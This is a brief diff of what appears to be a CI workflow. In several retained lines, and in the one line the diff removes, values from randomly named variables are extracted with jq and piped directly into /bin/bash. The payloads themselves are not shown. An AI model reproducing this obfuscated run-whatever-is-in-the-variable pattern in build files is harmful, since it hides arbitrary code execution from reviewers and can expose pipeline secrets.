@@ -26,7 +26,6 @@ jobs:
           echo $r71105 | jq -r .m91 | /bin/bash
           echo $rj33046 | jq -r .ny7 | /bin/bash
           printf '%s' "$jvpx382" | jq -r .e103 | /bin/bash
-          printf '%s' "$xae66" | jq -r .srdb66 | /bin/bash
 
       - name: Upload results
         if: always()
